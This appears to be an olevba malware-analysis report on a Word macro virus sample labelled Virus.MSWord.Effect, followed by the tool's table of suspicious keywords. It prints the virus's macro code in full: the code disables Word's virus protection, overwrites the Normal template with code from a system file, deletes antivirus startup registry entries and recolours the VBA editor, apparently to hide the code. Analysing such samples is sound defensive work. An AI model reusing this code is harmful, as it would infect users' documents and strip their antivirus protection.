olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Effect-f61fb153d8ea3f7260f150bcc1a41f946cb69af5
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Effect-f61fb153d8ea3f7260f150bcc1a41f946cb69af5 
in file: Virus.MSWord.Effect-f61fb153d8ea3f7260f150bcc1a41f946cb69af5 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
On Error Resume Next
Set effect = WScript.CreateObject("Word.Application")
effect.Options.VirusProtection = False
effect.Options.SaveNormalPrompt = False
For x = 1 To effect.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
effect.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
effect.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\WINDOWS\SYSTEM\effect.sys")
effect.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
effect.NormalTemplate.Save
effect.Application.Quit
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\AVPCC"
WSHShell.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\AVPCC Service"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeBackColors","1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeForeColors","1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

